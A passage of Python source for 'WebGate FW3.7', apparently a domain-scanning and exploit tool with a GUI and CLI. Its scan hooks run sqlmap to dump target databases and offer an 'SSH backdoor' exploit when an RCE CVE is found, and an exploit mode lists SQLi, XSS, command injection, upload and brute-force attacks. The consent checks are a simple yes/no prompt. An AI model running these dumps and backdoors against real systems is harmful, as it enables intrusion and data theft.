        self._build_ui()
        self._pulse_dot()
        if log_content.strip():
            self._log_w.configure(state="normal")
            self._log_w.insert("end", log_content + "\n")
            self._log_w.see("end")
            self._log_w.configure(state="disabled")
        else:
            self._push(t("init_msg"), "INFO")
        # Restore transparency
        self.root.after(50, lambda: self._set_alpha(
            SETTINGS.get("transparency", 0.93)))

    # ── Progress bar with shimmer + pulse ────────────────────
    def _draw_prog(self, val: int):
        self._prog_val = val
        cv = self._cv; cv.delete("all")
        w = cv.winfo_width(); h = cv.winfo_height()
        if w < 2: return
        th = self.th
        # Track with subtle gradient look (two-tone)
        cv.create_rectangle(0, 0, w, h, fill=th["BG4"], outline="")
        cv.create_rectangle(0, h//2, w, h, fill=th["BG3"], outline="")
        if val > 0:
            fw = max(6, int(w * val / 100))
            # Main bar — two-tone
            cv.create_rectangle(0, 0, fw, h, fill=th["ACC"], outline="")
            cv.create_rectangle(0, h//2+1, fw, h,
                fill=_lighten(th["ACC"], -0.15), outline="")
            # Bright leading edge pulse
            if fw > 6:
                cv.create_rectangle(max(0,fw-6), 0, fw, h,
                                    fill=th["WHITE"], outline="")
                cv.create_rectangle(max(0,fw-14), 0, max(0,fw-6), h,
                                    fill=_lighten(th["WHITE"], -0.3), outline="")
            # Shimmer stripe (animated separately via _shimmer)
            sx = getattr(self, "_shimmer_x", 0) % max(1, fw+80) - 40
            sw = 28
            if 0 < sx < fw:
                cv.create_rectangle(max(0,sx), 0, min(fw,sx+sw), h,
                    fill=_lighten(th["ACC"],0.5), outline="")
            # Percentage text overlay
            if fw > 60:
                pct_txt = f"{val}%"
                cv.create_text(min(fw-24, w//2), h//2,
                    text=pct_txt, fill=th["WHITE"],
                    font=("Courier New", max(6, h-2), "bold"))

    def _smooth_prog(self, target, cur=None, step=2):
        if cur is None: cur = self._prog_val
        if cur < target:
            cur = min(cur + step, target)
            self._draw_prog(cur)
            self.root.after(12, lambda: self._smooth_prog(target, cur, step))
        else:
            self._draw_prog(target)

    def _set_prog(self, v):
        self.root.after(0, lambda: self._smooth_prog(v))

    def _shimmer_tick(self):
        """Animate shimmer stripe across progress bar while scanning."""
        if not self.scanning: return
        self._shimmer_x = getattr(self, "_shimmer_x", 0) + 5
        self._draw_prog(self._prog_val)
        self.root.after(35, self._shimmer_tick)

    # ── Log system ────────────────────────────────────────────
    _PFX = {"INFO":"  ·  ","FOUND":"  +  ","WARN":"  !  ",
            "ERROR":"  ✗  ","STEP":"  ▶  ","SUCCESS":"  ✓  "}

    def _ins(self, txt: str, *tags):
        self._log_w.configure(state="normal")
        self._log_w.insert("end", txt, tags)
        self._log_w.see("end")
        self._log_w.configure(state="disabled")
        lines = int(self._log_w.index("end-1c").split(".")[0])
        try: self._evt_lbl.config(text=f"{max(0, lines-1)} lines")
        except: pass

    def _push(self, msg: str, level: str = "INFO", rule: bool = False):
        self._log_q.append((msg, level, rule))
        if not self._log_busy:
            self._log_busy = True
            self.root.after(0, self._flush)

    def _flush(self):
        if not self._log_q:
            self._log_busy = False; return
        msg, level, rule = self._log_q.pop(0)
        if rule:
            self._ins(f"{msg}\n", "rule")
            self.root.after(8, self._flush); return
        ts  = datetime.now().strftime("%H:%M:%S")
        pfx = self._PFX.get(level, "  ·  ")
        ltag = f"lvl_{level}"
        ptag = "pfx_h" if level in ("STEP", "SUCCESS", "ERROR") else ltag
        self._ins(f"[{ts}]", "ts")
        self._ins(pfx, ptag)
        if level == "STEP":
            self._type_msg(msg, level, 0,
                cb=lambda: self.root.after(40, self._flush))
        else:
            self._ins(f"{msg}\n", ltag)
            self.root.after(14, self._flush)

    def _type_msg(self, text: str, level: str, idx: int, cb):
        if idx >= len(text):
            self._ins("\n"); cb(); return
        self._ins(text[idx], f"lvl_{level}")
        if SETTINGS.get("sound") and idx % 2 == 0:
            play_click()
        self.root.after(10, lambda: self._type_msg(text, level, idx + 1, cb))

    def log_from_thread(self, msg: str, level: str):
        self.root.after(0, lambda: self._push(msg, level))

    # ── Step indicators ───────────────────────────────────────
    def _set_step(self, idx: int, state: str):
        if idx >= len(self._step_w): return
        dot, lbl = self._step_w[idx]; th = self.th
        cfg = {
            "active":  ("◉", th["ACC"],   th["WHITE"]),
            "done":    ("●", th["FG2"],   th["FG2"]),
            "error":   ("✗", th["ERR"],   th["ERR"]),
            "pending": ("○", th["FG3"],   th["FG3"]),
        }.get(state, ("○", th["FG3"], th["FG3"]))
        dot.config(text=cfg[0], fg=cfg[1])
        lbl.config(fg=cfg[2])

    def _reset_steps(self):
        for i in range(len(self._step_w)):
            self._set_step(i, "pending")

    def _stat(self, k, v, c=None):
        lbl = self._stats.get(k)
        if lbl:
            lbl.config(text=str(v), fg=c or self.th["FG"])

    # ── Clipboard ─────────────────────────────────────────────
    def _copy_log(self):
        try:
            content = self._log_w.get("1.0", "end-1c")
            copied = False

            # Try system clipboard tools first (persistent — survive window close)
            if sys.platform.startswith("linux"):
                # Detect Wayland vs X11
                wayland = bool(os.environ.get("WAYLAND_DISPLAY") or
                               os.environ.get("XDG_SESSION_TYPE", "").lower() == "wayland")
                if wayland:
                    for cmd in [["wl-copy"], ["xclip", "-selection", "clipboard"],
                                 ["xdotool", "type", "--clearmodifiers"]]:
                        try:
                            if subprocess.run(["which", cmd[0]],
                                    capture_output=True, timeout=2).returncode == 0:
                                if cmd[0] == "wl-copy":
                                    p = subprocess.Popen(["wl-copy"],
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
                                    p.communicate(content.encode())
                                    copied = True; break
                                elif cmd[0] == "xclip":
                                    p = subprocess.Popen(["xclip", "-selection", "clipboard"],
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
                                    p.communicate(content.encode())
                                    copied = True; break
                        except Exception:
                            continue
                else:
                    for cmd in [["xclip", "-selection", "clipboard"],
                                 ["xsel", "--clipboard", "--input"],
                                 ["wl-copy"]]:
                        try:
                            if subprocess.run(["which", cmd[0]],
                                    capture_output=True, timeout=2).returncode == 0:
                                p = subprocess.Popen(cmd,
                                    stdin=subprocess.PIPE,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                                p.communicate(content.encode())
                                copied = True; break
                        except Exception:
                            continue

            # Fallback: tkinter clipboard (may not persist after window close)
            if not copied:
                self.root.clipboard_clear()
                self.root.clipboard_append(content)
                self.root.update()
                copied = True

            if copied:
                self._push(t("copied"), "SUCCESS")
            else:
                self._push("Clipboard: install xclip or wl-copy", "WARN")
        except Exception as e:
            self._push(f"Clipboard error: {e}", "ERROR")

    def _clear_log(self):
        if self.scanning: return
        self._log_w.configure(state="normal")
        self._log_w.delete("1.0", "end")
        self._log_w.configure(state="disabled")
        self._evt_lbl.config(text="")

    # ── Scan lifecycle ────────────────────────────────────────
    def _get_domain(self):
        d = self._dvar.get().strip()
        if d == t("placeholder"): return ""
        return d

    def _on_scan(self):
        if self.scanning: return
        domain = self._get_domain()
        if not domain:
            self._push(t("enter_domain"), "WARN"); return
        self._begin_scan(domain, deep=False)

    def _on_deep_scan(self):
        if self.scanning: return
        domain = self._get_domain()
        if not domain:
            self._push(t("enter_domain"), "WARN"); return
        DisclaimerDialog(self.root,
            lambda: ToolSelectorDialog(self.root,
                lambda tools, ask: self._begin_scan(domain, deep=True,
                    tools=tools, ask_port=ask)))

    def _on_cancel(self):
        if self.scanner and self.scanning:
            self.scanner.cancelled = True
            self._push("Cancelling…", "WARN")

    def _begin_scan(self, domain: str, deep: bool = False,
                    tools=None, ask_port=False):
        self.scanning = True; th = self.th
        self._scan_rbtn.set_text("SCANNING…", icon="◉")
        self._scan_rbtn.set_disabled(True)
        self._deep_rbtn.set_disabled(True)
        self._cancel_rbtn.pack(side="left", padx=(8, 0))
        self._entry.config(state="disabled")
        self._reset_steps()
        self._log_q.clear(); self._log_busy = False
        self._log_w.configure(state="normal")
        self._log_w.delete("1.0", "end")
        self._log_w.configure(state="disabled")
        self._evt_lbl.config(text="")
        self._draw_prog(0)
        self._stat(t("stat_status"), "SCANNING", th["WHITE"])
        self._stat(t("stat_target"), domain, th["FG"])
        for k in [t("stat_ip"), t("stat_country"), t("stat_ports"),
                  t("stat_ssl"), t("stat_sec"), t("stat_time"), t("stat_eta")]:
            self._stat(k, "—", th["FG2"])
        self._prog_lbl.config(text=t("scanning"))
        self._scan_start = time.time()
        self._step_idx   = [0]
        self._shimmer_x  = 0
        self._tick()
        self._shimmer_tick()
        self._particle_burst()   # Visual effect on scan start
        self._scanline_tick()    # Border animation during scan
        threading.Thread(
            target=self._thread,
            args=(domain, deep, tools, ask_port),
            daemon=True
        ).start()

    def _tick(self):
        if not self.scanning: return
        el  = time.time() - self._scan_start
        pv  = self._prog_val
        eta = "—"
        if pv > 5:
            total_est = el / (pv / 100)
            rem = max(0, total_est - el)
            eta = f"{int(rem)}s"
        try:
            self._stat(t("stat_time"), f"{el:.0f}s", self.th["FG2"])
            self._stat(t("stat_eta"),  eta,           self.th["FG3"])
        except: pass
        self.root.after(1000, self._tick)

    def _thread(self, domain: str, deep: bool,
                tools=None, ask_port=False):
        idx = [0]

        def on_log(msg, level):
            if level == "STEP":
                i = idx[0]
                if i > 0:
                    self.root.after(0, lambda k=i-1: self._set_step(k, "done"))
                self.root.after(0, lambda k=i: self._set_step(k, "active"))
                idx[0] += 1
            if "IPv4" in msg:
                ip = msg.split(":")[-1].strip()
                self.root.after(0, lambda v=ip: self._stat(t("stat_ip"), v, self.th["FG"]))
            if "Open:" in msg:
                n = msg.split("Open:")[-1].split()[0]
                self.root.after(0, lambda v=n: self._stat(t("stat_ports"), v, self.th["FG"]))
            if "TLS version" in msg:
                self.root.after(0, lambda: self._stat(t("stat_ssl"), "✓", self.th["ACC3"]))
            if "Security score" in msg:
                sc = msg.split(":")[-1].strip()
                self.root.after(0, lambda v=sc: self._stat(t("stat_sec"), v, self.th["FG"]))
            if "Country" in msg and ":" in msg:
                country = msg.split(":")[-1].strip()
                self.root.after(0, lambda v=country: self._stat(t("stat_country"), v, self.th["FG"]))
            self.log_from_thread(msg, level)

        def on_prog(v):
            self._set_prog(v)

        # Ask-per-port callback
        ask_cb = None
        if ask_port:
            def ask_cb(port, svc):
                cves = query_cve(svc.lower())
                return ask_port_gui(self.root, port, svc, cves)

        self.scanner = DomainScanner(domain, log_cb=on_log, prog_cb=on_prog)

        # Patch scan_ports to use ask_cb
        orig_scan = self.scanner.scan_ports
        if ask_cb:
            self.scanner.scan_ports = lambda: orig_scan(ask_cb=ask_cb)

        report  = self.scanner.run()
        results = self.scanner.results

        # Surface panel (slides from bottom)
        def _show_panel():
            def _start_deep():
                ds = DeepScanner(domain, log_cb=on_log, prog_cb=on_prog,
                                 tools=tools or SETTINGS.get("deep_tools", {}))
                self.scanner = ds
                threading.Thread(target=ds.run, daemon=True).start()
            SurfacePanel(self.root, results, domain,
                on_deep=_start_deep if not deep else None)
        self.root.after(400, _show_panel)

        if deep and not self.scanner.cancelled:
            ds = DeepScanner(domain, log_cb=on_log, prog_cb=on_prog,
                             tools=tools or SETTINGS.get("deep_tools", {}))
            self.scanner = ds
            ds.run()

        last = idx[0] - 1
        if last >= 0:
            self.root.after(0, lambda k=last: self._set_step(k, "done"))
        self.root.after(0, lambda: self._done(
            report, results, domain, self.scanner.cancelled))

    def _done(self, report: str, results: dict, domain: str, cancelled: bool):
        self.scanning = False; th = self.th
        self._scan_rbtn.set_text(t("scan_btn"), icon="▶")
        self._scan_rbtn.set_disabled(False)
        self._deep_rbtn.set_disabled(False)
        self._cancel_rbtn.pack_forget()
        self._entry.config(state="normal")
        self._prog_lbl.config(
            text=t("cancelled") if cancelled else t("complete"))
        self._stat(t("stat_status"),
            "CANCELLED" if cancelled else "COMPLETE ✓",
            th["FG2"] if cancelled else th["ACC3"])
        try: self._eta_lbl.config(text="")
        except: pass
        if not cancelled:
            self._draw_prog(100)
            if report:
                self._push(f"Report saved: {report}", "FOUND")
            send_notification(t("notif_title"),
                f"{t('notif_body')} {domain}")
            self.root.after(800, self._blink)
            # Post-scan: check for SQLMap databases → offer dump dialog
            sqlmap_dbs = results.get("sqlmap_databases") or []
            if sqlmap_dbs:
                self.root.after(1200, lambda: self._offer_sqlmap_dump(
                    domain, sqlmap_dbs))
            # Post-scan: check for RCE-capable CVEs → offer SSH exploit
            else:
                self.root.after(1200, lambda: self._check_rce_cves(domain, results))

    def _offer_sqlmap_dump(self, domain, databases):
        """Show interactive SQLMap dump dialog."""
        def _on_dump(db, table):
            self._push(f"SQLMap dump: {db}.{table or '*'}", "STEP")
            import threading
            def _run_dump():
                try:
                    url = f"http://{domain}/?id=1"
                    cmd = ["sqlmap", "-u", url, "--batch",
                           f"-D", db, "--output-dir=/tmp/sqlmap_wg"]
                    if table:
                        cmd += [f"-T", table, "--dump"]
                    else:
                        cmd += ["--tables"]
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    # Parse and simplify output
                    lines = [l for l in r.stdout.split("\n")
                             if l.strip() and not l.startswith("[") or "|" in l]
                    simplified = "\n".join(lines[:60])
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    fn = os.path.join(_REPORTS_DIR, f"sqlmap_dump_{re.sub(r'[^\\w]','_',domain)}_{ts}.txt")
                    with open(fn, "w") as f:
                        f.write(r.stdout)
                    self.log_from_thread(f"Dump saved: {fn}", "FOUND")
                    for line in lines[:20]:
                        if line.strip():
                            self.log_from_thread(line.strip()[:80], "FOUND")
                except Exception as e:
                    self.log_from_thread(f"Dump error: {e}", "ERROR")
            threading.Thread(target=_run_dump, daemon=True).start()
        SQLMapDumpDialog(self.root, domain, databases, _on_dump)

    def _check_rce_cves(self, domain, results):
        """After scan: if RCE CVE found, offer SSH backdoor exploit."""
        ports = results.get("ports", {})
        rce_found = None
        rce_desc  = ""
        for port_info in ports.get("open", []):
            for cve_id, cve_desc in port_info.get("cves", []):
                if cve_id in ExploitFramework.RCE_CVES or "RCE" in cve_desc or "9.8" in cve_desc:
                    if "rce" in cve_desc.lower() or "remote code" in cve_desc.lower() or "9.8" in cve_desc:
                        rce_found = cve_id
                        rce_desc  = cve_desc
                        break
            if rce_found:
                break
        if not rce_found:
            return

        def _on_exploit_yes():
            """User wants to try exploit — scope agreement first."""
            def _on_scope_accept():
                """Scope accepted — show SSH backdoor config."""
                def _on_ssh_start(user, pwd, bridge):
                    self._push(f"SSH exploit: {rce_found} → {user}@{domain}", "STEP")
                    import threading
                    def _run():
                        ef = ExploitFramework(domain,
                            log_cb=self.log_from_thread,
                            prog_cb=self._set_prog)
                        ef.try_ssh_backdoor(rce_found, user, pwd, bridge)
                    threading.Thread(target=_run, daemon=True).start()
                SSHBackdoorDialog(self.root, domain, rce_found, _on_ssh_start)
            ScopeAgreementDialog(self.root, rce_found, rce_desc, domain, _on_scope_accept)

        CVEExploitOfferDialog(self.root, domain, rce_found, rce_desc, _on_exploit_yes)

    def _blink(self, count=0):
        if count >= 14 or self.scanning: return
        self._log_w.configure(state="normal")
        try: self._log_w.delete("cs", "ce")
        except: pass
        if count % 2 == 0:
            self._log_w.mark_set("cs", "end-1c")
            self._log_w.insert("end", "█", "cursor")
            self._log_w.mark_set("ce", "end-1c")
        self._log_w.configure(state="disabled")
        self.root.after(450, lambda: self._blink(count + 1))

    # ── Misc ──────────────────────────────────────────────────
    def _open_url(self, url: str):
        import webbrowser; webbrowser.open(url)

    def _zoom_font(self, delta: int):
        """Ctrl+scroll to zoom log font size."""
        self._font_size = max(7, min(20, self._font_size + delta))
        fs = self._font_size
        try:
            self._log_w.config(font=(self.font, fs))
        except Exception:
            pass

    def _open_settings(self):
        SettingsDialog(self.root, self._apply_theme)

    def run(self): pass  # GUI launched via launch_gui()


# ═══════════════════════════════════════════════════════════════
# CLI INTERFACE
# ═══════════════════════════════════════════════════════════════
class CLIInterface:
    def __init__(self):
        self._last_prog = -1
        self._scope_agreed = False

    def log_cb(self, msg, level):
        pfx = {"INFO":    C.GRY  + "·",
               "FOUND":   C.WHT  + "+",
               "WARN":    C.YLW  + "!",
               "ERROR":   C.RED  + "✗",
               "STEP":    C.BLU  + "»",
               "SUCCESS": C.GRN  + "✓"}.get(level, "·")
        print(f"  {pfx}{C.RST} {msg}")

    def prog_cb(self, v):
        v = int(v)
        if v == self._last_prog: return
        self._last_prog = v
        bar = "█" * (v // 5) + "░" * (20 - v // 5)
        print(f"\r  {C.GRY}[{bar}] {v:3d}%{C.RST}", end="", flush=True)
        if v >= 100:
            print()

    def shell(self):
        print(BANNER)
        print(f"{C.DIM}  WebGate FW3.7 — Domain Security Auditor + Network Agent + Exploit Framework")
        print(f"  Type 'help' for commands, 'exit' to quit.{C.RST}\n")
        while True:
            try:
                raw = input(f"  {C.WHT}webgate{C.RST}{C.GRY}>{C.RST} ").strip()
            except (KeyboardInterrupt, EOFError):
                print(f"\n  {C.GRY}Bye!{C.RST}"); break
            if not raw: continue
            cmd_parts = raw.split(None, 1)
            cmd = cmd_parts[0].lower()
            arg = cmd_parts[1].strip() if len(cmd_parts) > 1 else ""

            if cmd in ("exit", "quit", "q"):
                print(f"  {C.GRY}Bye!{C.RST}"); break
            elif cmd in ("help", "?"):
                self._help()
            elif cmd in ("gui", "--gui"):
                print(f"  {C.BLU}»{C.RST} Launching GUI…")
                launch_gui(); return
            elif cmd == "deep":
                if not arg:
                    print(f"  {C.RED}Usage: deep <domain>{C.RST}"); continue
                self.quick(arg, deep=True)
            elif cmd == "agent":
                self.agent_mode()
            elif cmd == "exploit":
                if not arg:
                    print(f"  {C.RED}Usage: exploit <domain>{C.RST}"); continue
                self.exploit_mode(arg)
            elif cmd == "finger":
                if not arg:
                    print(f"  {C.RED}Usage: finger <domain>{C.RST}"); continue
                self.fingerprint(arg)
            elif cmd == "verify":
                if not arg:
                    print(f"  {C.RED}Usage: verify <domain>{C.RST}"); continue
                self.verify_cve(arg)
            elif cmd == "full":
                if not arg:
                    print(f"  {C.RED}Usage: full <domain>{C.RST}"); continue
                self.full_scan(arg)
            elif cmd == "subs":
                if not arg:
                    print(f"  {C.RED}Usage: subs <domain>{C.RST}"); continue
                self.enum_subdomains(arg)
            elif cmd == "bulk":
                if not arg:
                    print(f"  {C.RED}Usage: bulk <file.txt>{C.RST}"); continue
                self.bulk_scan(arg)
            elif cmd == "proxy":
                if not arg:
                    print(f"  {C.GRY}Current proxy: {_PROXY_CONFIG['http'] or 'none'}{C.RST}")
                    print(f"  {C.GRY}Usage: proxy http://host:port  or  proxy off{C.RST}")
                elif arg == "off":
                    set_proxy(""); print(f"  {C.GRN}Proxy disabled{C.RST}")
                else:
                    set_proxy(arg); print(f"  {C.GRN}Proxy set: {arg}{C.RST}")
                continue
            elif cmd == "export":
                self._export_info()
            elif cmd == "settings":
                self._show_settings()
            elif cmd == "tools":
                self._show_tools()
            elif cmd == "version":
                print(f"  {C.WHT}WebGate FW3.7{C.RST} by c3less")
            else:
                # Treat as domain scan
                self.quick(raw)

    def quick(self, domain: str, deep: bool = False):
        print(f"\n  {C.WHT}[*]{C.RST} Target: {C.BOLD}{domain}{C.RST}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        self._last_prog = -1
        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
        report = sc.run()

        # Run fingerprinting
        fp = ServiceFingerprinter(domain, log_cb=self.log_cb)
        fp_result = fp.fingerprint()

        # Run CVE verification on open ports
        open_ports = sc.results.get("ports", {}).get("open", [])
        if open_ports:
            cv = CVEVerifier(domain, open_ports, log_cb=self.log_cb)
            cv.verify_all()

        if deep and not sc.cancelled:
            ds = DeepScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
            ds.run()
        if report:
            print(f"\n  {C.GRN}[✓]{C.RST} Report: {report}\n")

    def fingerprint(self, domain: str):
        """Standalone fingerprinting command."""
        print(f"\n  {C.WHT}[*]{C.RST} Fingerprinting: {C.BOLD}{domain}{C.RST}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        fp = ServiceFingerprinter(domain, log_cb=self.log_cb)
        result = fp.fingerprint()
        print(f"\n  {C.GRN}[✓]{C.RST} Fingerprint complete\n")

    def verify_cve(self, domain: str):
        """Standalone CVE verification."""
        print(f"\n  {C.WHT}[*]{C.RST} CVE Verification: {C.BOLD}{domain}{C.RST}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        self._last_prog = -1
        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
        sc.run()
        open_ports = sc.results.get("ports", {}).get("open", [])
        if open_ports:
            cv = CVEVerifier(domain, open_ports, log_cb=self.log_cb)
            verified = cv.verify_all()
            likely = [v for v in verified if v["status"] == "LIKELY"]
            if likely:
                print(f"\n  {C.RED}[!]{C.RST} {len(likely)} CVE(s) LIKELY exploitable:")
                for v in likely:
                    print(f"      {C.RED}{v['cve_id']}{C.RST} on port {v['port']} ({v['service']})")
        else:
            print(f"  {C.GRY}No open ports found{C.RST}")
        print()

    def agent_mode(self):
        """Network agent: scan local network, find most vulnerable host."""
        print(f"\n  {C.WHT}[*]{C.RST} {C.BOLD}AGENT MODE — Network Assessment{C.RST}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        self._last_prog = -1
        agent = NetworkAgent(log_cb=self.log_cb, prog_cb=self.prog_cb)
        result = agent.run()

        most_vuln = result.get("most_vulnerable")
        if most_vuln and most_vuln["score"] > 0:
            print(f"\n  {C.YLW}[?]{C.RST} Deep scan the most vulnerable host ({most_vuln['ip']})? [y/N] ", end="")
            try:
                ans = input().strip().lower()
                if ans in ("y", "yes"):
                    self.quick(most_vuln["ip"], deep=True)
            except:
                pass
        print()

    def exploit_mode(self, domain: str):
        """Exploit mode — requires scope agreement."""
        print(f"\n{C.RED}{SCOPE_AGREEMENT_TEXT}{C.RST}")
        print(f"  {C.YLW}Do you have a signed Scope Agreement for {domain}? [Y/n]{C.RST} ", end="")
        try:
            ans = input().strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {C.GRY}Cancelled.{C.RST}"); return

        if ans.upper() != "Y":
            print(f"  {C.RED}Exploit mode requires agreement. Cancelled.{C.RST}\n")
            return

        self._scope_agreed = True
        print(f"\n  {C.GRN}[✓]{C.RST} Scope Agreement accepted.")
        print(f"  {C.WHT}[*]{C.RST} Starting exploit session against: {C.BOLD}{domain}{C.RST}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        self._last_prog = -1

        ef = ExploitFramework(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
        ef.run()
        print(f"\n  {C.GRN}[✓]{C.RST} Exploit session complete\n")

    def enum_subdomains(self, domain: str):
        """Standalone subdomain enumeration."""
        print(f"\n  {C.WHT}[*]{C.RST} Subdomain Enumeration: {C.BOLD}{domain}{C.RST}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
        sc.enumerate_subdomains()
        subs = sc.results.get("subdomains", [])
        if subs:
            print(f"\n  {C.GRN}[✓]{C.RST} Found {len(subs)} subdomains\n")
        else:
            print(f"\n  {C.GRY}No subdomains found{C.RST}\n")

    def bulk_scan(self, filepath: str):
        """Scan multiple targets from a file (one domain per line)."""
        if not os.path.isfile(filepath):
            print(f"  {C.RED}File not found: {filepath}{C.RST}")
            return
        with open(filepath) as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        if not targets:
            print(f"  {C.RED}No targets in file{C.RST}")
            return

        print(f"\n  {C.WHT}[*]{C.RST} {C.BOLD}BULK SCAN{C.RST} — {len(targets)} targets from {filepath}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")

        results_summary = []
        for i, target in enumerate(targets):
            print(f"\n  {C.CYN}[{i+1}/{len(targets)}]{C.RST} {target}")
            print(f"  {C.GRY}{'─' * 40}{C.RST}")
            self._last_prog = -1
            sc = DomainScanner(target, log_cb=self.log_cb, prog_cb=self.prog_cb)
            report = sc.run()
            open_ports = len(sc.results.get("ports", {}).get("open", []))
            risks = sc._build_risks()
            crit = sum(1 for s, _ in risks if s == "CRITICAL")
            results_summary.append({
                "target": target, "open_ports": open_ports,
                "risks": len(risks), "critical": crit, "report": report
            })

        # Print summary table
        print(f"\n  {C.WHT}{'═' * 56}{C.RST}")
        print(f"  {C.WHT}BULK SCAN SUMMARY{C.RST}")
        print(f"  {C.WHT}{'═' * 56}{C.RST}")
        for r in sorted(results_summary, key=lambda x: x["critical"], reverse=True):
            risk_color = C.RED if r["critical"] > 0 else (C.YLW if r["risks"] > 2 else C.GRN)
            print(f"  {risk_color}{'●'}{C.RST} {r['target']:<28} "
                  f"Ports:{r['open_ports']:<3} Risks:{r['risks']:<3} Crit:{r['critical']}")
        print()

    def full_scan(self, domain: str):
        """Full scan: surface + fingerprint + CVE verify + deep."""
        print(f"\n  {C.WHT}[*]{C.RST} {C.BOLD}FULL SCAN{C.RST}: {domain}")
        print(f"  {C.GRY}{'─' * 56}{C.RST}")
        self._last_prog = -1

        # 1) Surface scan
        self.log_cb("Phase 1: Surface scan", "STEP")
        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
        report = sc.run()

        # 2) Fingerprint
        self.log_cb("Phase 2: Fingerprinting", "STEP")
        fp = ServiceFingerprinter(domain, log_cb=self.log_cb)
        fp.fingerprint()

        # 3) CVE verification
        open_ports = sc.results.get("ports", {}).get("open", [])
        if open_ports:
            self.log_cb("Phase 3: CVE verification", "STEP")
            cv = CVEVerifier(domain, open_ports, log_cb=self.log_cb)
            cv.verify_all()

        # 4) Deep scan
        self.log_cb("Phase 4: Deep scan", "STEP")
        ds = DeepScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
        ds.run()

        if report:
            print(f"\n  {C.GRN}[✓]{C.RST} Full scan complete. Report: {report}\n")

    def _show_tools(self):
        """Show installed/missing tools."""
        print(f"\n  {C.WHT}Tool Status:{C.RST}")
        for key, info in TOOL_CATALOG.items():
            if info["ext"]:
                cmd = info["cmd"]
                try:
                    installed = subprocess.run(["which", cmd], capture_output=True).returncode == 0
                except:
                    installed = False
                status = f"{C.GRN}✓{C.RST}" if installed else f"{C.RED}✗{C.RST}"
                print(f"    {status} {info['label']:<24} ({cmd})")
        print()

    def _show_settings(self):
        """Show current settings."""
        print(f"\n  {C.WHT}Current Settings:{C.RST}")
        for k, v in SETTINGS.items():
            if k != "deep_tools":
                print(f"    {k:<16}: {v}")
        print()

    def _export_info(self):
        """Export system info for debugging."""
        print(f"\n  {C.WHT}System Info:{C.RST}")
        print(f"    Platform   : {sys.platform}")
        print(f"    Python     : {sys.version.split()[0]}")
        print(f"    DNS module : {'yes' if DNS_OK else 'no'}")
        print(f"    WHOIS      : {'yes' if WHOIS_OK else 'no'}")
        print(f"    Requests   : {'yes' if REQUESTS_OK else 'no'}")
        print(f"    Netifaces  : {'yes' if NETIFACES_OK else 'no'}")
        print(f"    Paramiko   : {'yes' if PARAMIKO_OK else 'no'}")
        print(f"    CVE DB     : {get_all_cve_count()} entries")

        # Check Termux
        is_termux = os.environ.get("TERMUX_VERSION") or os.path.isdir("/data/data/com.termux")
        print(f"    Termux     : {'yes' if is_termux else 'no'}")
        print()

    def _help(self):
        print(f"""
  {C.WHT}{'─' * 56}{C.RST}
  {C.WHT}WebGate FW3.7 — Commands{C.RST}
  {C.WHT}{'─' * 56}{C.RST}

  {C.CYN}Scanning:{C.RST}
  {C.GRY}<domain>              {C.RST}Surface scan + fingerprint + CVE verify
  {C.GRY}deep <domain>         {C.RST}Surface + deep scan (30+ tools)
  {C.GRY}full <domain>         {C.RST}Complete: surface + finger + CVE + deep
  {C.GRY}finger <domain>       {C.RST}Device/OS/CMS fingerprinting only
  {C.GRY}verify <domain>       {C.RST}CVE verification on open ports

  {C.CYN}Network:{C.RST}
  {C.GRY}agent                 {C.RST}Scan local network, find most vulnerable
  {C.GRY}subs <domain>         {C.RST}Subdomain enumeration (80+ prefixes)
  {C.GRY}bulk <file.txt>       {C.RST}Scan targets from file (one per line)

  {C.CYN}Exploit (Scope Agreement required):{C.RST}
  {C.GRY}exploit <domain>      {C.RST}SQLi, XSS, CMDi, upload, backdoor, LFI, brute

  {C.CYN}Config:{C.RST}
  {C.GRY}proxy <url|off>       {C.RST}Set/disable HTTP proxy (http://host:port)
  {C.GRY}tools                 {C.RST}Show installed/missing tools
  {C.GRY}settings              {C.RST}Show current settings
  {C.GRY}export                {C.RST}Export system info
  {C.GRY}version               {C.RST}Show version
  {C.GRY}gui                   {C.RST}Launch GUI (desktop only)
  {C.GRY}help                  {C.RST}This help
  {C.GRY}exit                  {C.RST}Exit WebGate
""")


# ═══════════════════════════════════════════════════════════════
# LAUNCH GUI
# ═══════════════════════════════════════════════════════════════
def launch_gui(domain: str = ""):
    _init_sound()

    # ── Display detection (Wayland / Hyprland / X11) ──────────
    if sys.platform.startswith("linux"):
        if not os.environ.get("DISPLAY"):
            # Auto-detect XWayland socket
            import glob
            sockets = sorted(glob.glob("/tmp/.X11-unix/X*"))
            if sockets:
                num = sockets[0].split("X")[-1]
                os.environ["DISPLAY"] = f":{num}"
                print(f"  [*] Auto-detected DISPLAY=:{num}")
            else:
                os.environ["DISPLAY"] = ":0"

    # ── Import tkinter ─────────────────────────────────────────
    try:
        import tkinter as tk
    except ImportError:
        print("[!] tkinter missing. Run: sudo pacman -S tk"); return

    # ── Verify display connection ──────────────────────────────
    try:
        _test = tk.Tk(); _test.destroy()
    except Exception as e:
        print(f"[!] Cannot connect to display: {e}")
        print(f"    DISPLAY={os.environ.get('DISPLAY','not set')}")
        print(f"    Try: DISPLAY=:0 webgate --gui")
        return

    # ── Create root ────────────────────────────────────────────
